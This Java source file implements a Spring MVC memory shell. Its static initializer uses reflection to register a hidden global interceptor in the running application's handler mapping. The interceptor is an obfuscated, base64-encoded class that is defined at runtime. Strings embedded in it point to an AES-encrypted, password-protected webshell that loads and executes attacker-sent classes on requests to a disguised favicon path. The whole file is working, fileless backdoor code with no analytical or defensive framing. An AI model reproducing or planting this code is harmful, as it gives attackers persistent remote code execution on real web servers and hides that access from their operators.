package core.memshell;

import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;

import java.lang.reflect.Method;

public class SpringInterceptorMemShell {

    private static Object MEMSHELL_OBJECT;
    private static final String interceptor_name = "memshell.SpringInterceptorShell";

    public SpringInterceptorMemShell() {
        InjectMemClass();
        InjectMem();
    }


    public static synchronized void InjectMem() {
        try {
            WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
            // 从context中获取AbstractHandlerMapping的实例对象
            org.springframework.web.servlet.handler.AbstractHandlerMapping abstractHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping) context.getBean("org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping");
            // 反射获取adaptedInterceptors属性
            java.lang.reflect.Field field = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
            field.setAccessible(true);
            java.util.ArrayList<Object> adaptedInterceptors = (java.util.ArrayList<Object>) field.get(abstractHandlerMapping);
            // 避免重复添加
            for (int i = adaptedInterceptors.size() - 1; i > 0; i--) {
                if (adaptedInterceptors.get(i).getClass().getName().equals(interceptor_name)) {
                    System.out.println("已经添加过TestInterceptor实例了");
                }
            }
            adaptedInterceptors.add(MEMSHELL_OBJECT);  //  添加全局interceptor
        } catch (Exception e) {

        }
    }


    public static synchronized void InjectMemClass() {
        try {
            MEMSHELL_OBJECT = Thread.currentThread().getContextClassLoader().loadClass(interceptor_name).newInstance();
        } catch (Exception var5) {
            try {
                Method var1 = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
                var1.setAccessible(true);
                byte[] var2 = base64Decode("yv66vgAAADMBJAoAUwCQCACRCQBSAJIIAJMJAFIAlAgAlQkAUgCWBwCXCgAIAJAKAAgAmAoACACZCgBSAJoJAFIAmwgAnAkAUgCdCACeCgCfAKAHAKEKAC0AogoAEgCjCgCfAKQKAJ8ApQcApggApwoAqACpCgAtAKoKAKgAqwcArAoAqACtCgAcAK4KABwArwoALQCwCACxCgAqALIIALMHALQKACoAtQcAtgoAtwC4CgAsALkIALoHALsHAGgHALwHAL0IAL4KACoAvwgAwAgAwQgAwggAwwgAxAgAxQsAxgDHCADICgAtAMkLAMYAygsAxgDLCgBSAMwKAFIAzQgAzgsAzwDQBwDRCgAqANIKAD8A0woAPwDUCwDPANUIANYLAMYA1QcA1woARgCQCgAsANgLANkA2goALQDbCgDcAN0KACwAmQoARgDeCgBSAN8KAC0A4AgA4QgA4gcA4wcA5AEAAnhjAQASTGphdmEvbGFuZy9TdHJpbmc7AQADUHdkAQAEcGF0aAEAA21kNQEAAmNzAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBACFMbWVtc2hlbGwvU3ByaW5nSW50ZXJjZXB0b3JTaGVsbDsBAAF4AQAHKFtCWilbQgEAAWMBABVMamF2YXgvY3J5cHRvL0NpcGhlcjsBAAR2YXI0AQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQABcwEAAltCAQABbQEAAVoBAA1TdGFja01hcFRhYmxlBwDjBwDlBwCmAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAB1MamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0OwEAA3JldAcAvQEADGJhc2U2NEVuY29kZQEAFihbQilMamF2YS9sYW5nL1N0cmluZzsBAAdFbmNvZGVyAQASTGphdmEvbGFuZy9PYmplY3Q7AQAGYmFzZTY0AQARTGphdmEvbGFuZy9DbGFzczsBAAR2YXI2AQACYnMBAAV2YWx1ZQEACkV4Y2VwdGlvbnMBAAxiYXNlNjREZWNvZGUBABYoTGphdmEvbGFuZy9TdHJpbmc7KVtCAQAHZGVjb2RlcgEACXByZUhhbmRsZQEAZChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7TGphdmEvbGFuZy9PYmplY3Q7KVoBAAZhcnJPdXQBAB9MamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW07AQABZgEAB3Nlc3Npb24BACBMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uOwEABGRhdGEBAAdyZXF1ZXN0AQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAIcmVzcG9uc2UBAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQAHaGFuZGxlcgcA5gEAClNvdXJjZUZpbGUBABtTcHJpbmdJbnRlcmNlcHRvclNoZWxsLmphdmEMAFoAWwEAEDNjNmUwYjhhOWMxNTIyNGEMAFQAVQEABHBBUzMMAFYAVQEAEC9mYXZpY29uZGVtby5pY28MAFcAVQEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyDADnAOgMAOkA6gwAWABvDABYAFUBAAVVVEYtOAwAWQBVAQADQUVTBwDlDADrAOwBAB9qYXZheC9jcnlwdG8vc3BlYy9TZWNyZXRLZXlTcGVjDADtAO4MAFoA7wwA8ADxDADyAPMBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQADTUQ1BwD0DADrAPUMAPYA9wwA+AD5AQAUamF2YS9tYXRoL0JpZ0ludGVnZXIMAPoA7gwAWgD7DADpAPwMAP0A6gEAEGphdmEudXRpbC5CYXNlNjQMAP4A/wEACmdldEVuY29kZXIBABJbTGphdmEvbGFuZy9DbGFzczsMAQABAQEAE1tMamF2YS9sYW5nL09iamVjdDsHAQIMAQMBBAwBBQEGAQAOZW5jb2RlVG9TdHJpbmcBAA9qYXZhL2xhbmcvQ2xhc3MBABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N0cmluZwEAFnN1bi5taXNjLkJBU0U2NEVuY29kZXIMAQcBCAEABmVuY29kZQEACmdldERlY29kZXIBAAZkZWNvZGUBABZzdW4ubWlzYy5CQVNFNjREZWNvZGVyAQAMZGVjb2RlQnVmZmVyAQAQWC1SZXF1ZXN0ZWQtV2l0aAcBCQwBCgBvAQAOWE1MSFRUUFJlcXVlc3QMAQsBDAwBDQEODAEPAG8MAH0AfgwAYQBiAQAQbWVtc2hlbGwucGF5bG9hZAcA5gwBEAERAQAKbWVtc2hlbGwvWAwBEgETDABaARQMARUBFgwBFwEYAQAKcGFyYW1ldGVycwEAHWphdmEvaW8vQnl0ZUFycmF5T3V0cHV0U3RyZWFtDAEZARoHARsMARwBHQwBHgEfBwEgDAEhASIMASMA7gwAcwB0DAEeAPwBAA5YbWxIVFRQUmVxdWVzdAEAB1N1Y2Nlc3MBAB9tZW1zaGVsbC9TcHJpbmdJbnRlcmNlcHRvclNoZWxsAQBBb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9oYW5kbGVyL0hhbmRsZXJJbnRlcmNlcHRvckFkYXB0ZXIBABNqYXZheC9jcnlwdG8vQ2lwaGVyAQAeamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uAQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAIdG9TdHJpbmcBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEAC2dldEluc3RhbmNlAQApKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YXgvY3J5cHRvL0NpcGhlcjsBAAhnZXRCeXRlcwEABCgpW0IBABcoW0JMamF2YS9sYW5nL1N0cmluZzspVgEABGluaXQBABcoSUxqYXZhL3NlY3VyaXR5L0tleTspVgEAB2RvRmluYWwBAAYoW0IpW0IBABtqYXZhL3NlY3VyaXR5L01lc3NhZ2VEaWdlc3QBADEoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3NlY3VyaXR5L01lc3NhZ2VEaWdlc3Q7AQAGbGVuZ3RoAQADKClJAQAGdXBkYXRlAQAHKFtCSUkpVgEABmRpZ2VzdAEABihJW0IpVgEAFShJKUxqYXZhL2xhbmcvU3RyaW5nOwEAC3RvVXBwZXJDYXNlAQAHZm9yTmFtZQEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsBAAlnZXRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQALbmV3SW5zdGFuY2UBABQoKUxqYXZhL2xhbmcvT2JqZWN0OwEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QBAAlnZXRIZWFkZXIBAAdpbmRleE9mAQAVKExqYXZhL2xhbmcvU3RyaW5nOylJAQAKZ2V0U2Vzc2lvbgEAIigpTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2Vzc2lvbjsBAAxnZXRQYXJhbWV0ZXIBAAxnZXRBdHRyaWJ1dGUBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvT2JqZWN0OwEADmdldENsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEAGihMamF2YS9sYW5nL0NsYXNzTG9hZGVyOylWAQABUQEAFShbQilMamF2YS9sYW5nL0NsYXNzOwEADHNldEF0dHJpYnV0ZQEAJyhMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL09iamVjdDspVgEABmVxdWFscwEAFShMamF2YS9sYW5nL09iamVjdDspWgEAJmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlAQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsBAAlzdWJzdHJpbmcBABYoSUkpTGphdmEvbGFuZy9TdHJpbmc7AQATamF2YS9pby9QcmludFdyaXRlcgEABXdyaXRlAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQALdG9CeXRlQXJyYXkAIQBSAFMAAAAFAAAAVABVAAAAAQBWAFUAAAABAFcAVQAAAAAAWABVAAAAAQBZAFUAAAAGAAEAWgBbAAEAXAAAAH4AAwABAAAAPCq3AAEqEgK1AAMqEgS1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");
                Class var3 = (Class) var1.invoke(Thread.currentThread().getContextClassLoader(), var2, 0, var2.length);
                MEMSHELL_OBJECT = var3.newInstance();
            } catch (Exception var4) {
            }
        }
    }

    public static byte[] base64Decode(String bs) throws Exception {
        byte[] value = null;

        Class base64;
        try {
            base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", (Class[]) null).invoke(base64, (Object[]) null);
            value = (byte[]) ((byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs));
        } catch (Exception var6) {
            try {
                base64 = Class.forName("sun.misc.BASE64Decoder");
                Object decoder = base64.newInstance();
                value = (byte[]) ((byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs));
            } catch (Exception var5) {
            }
        }

        return value;
    }

    static {
        new SpringInterceptorMemShell();
    }
}
